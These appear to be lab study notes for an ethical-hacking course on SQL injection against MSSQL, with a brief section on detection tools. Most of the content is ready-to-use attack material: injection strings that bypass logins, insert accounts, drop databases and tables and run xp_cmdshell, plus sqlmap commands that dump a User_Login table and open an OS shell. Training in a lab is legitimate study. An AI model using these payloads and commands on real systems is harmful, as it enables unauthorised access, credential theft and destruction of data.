# SQL Injection

## Perform SQL injection attacks

- Perform an SQL injection attack on an MSSQL database  
    SQL Payload: blah' or 1=1 --  
    blah';insert into login values ('john','apple123'); --  
    blah';create database mydatabase; --  
    blah'; DROP DATABASE mydatabase; --  
    blah'; DROP TABLE table_name; --  
    blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --  

- Perform an SQL injection attack against MSSQL to extract databases using sqlmap  
    `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookievalue that you copied in Step 8]" --dbs`  
    `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copiedin Step 8]" -D moviescope --tables`  
    `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copiedin Step 8]" -D moviescope -T User_Login --dump`  
    `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1"--cookie="[cookie value which you have copied in Step 8]" --os-shell` --> TASKLIST  
    --technique=BEUSTQ
    --dbms=mssql or --dbms=mysql
    --dump

## Detect SQL injection vulnerabilities using various SQL injection detection tools

- Detect SQL injection vulnerabilities using DSSS

```bash
python3 dsss.py
python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 11]"
```

- Detect SQL injection vulnerabilities using OWASP ZAP  
    Alerts tab
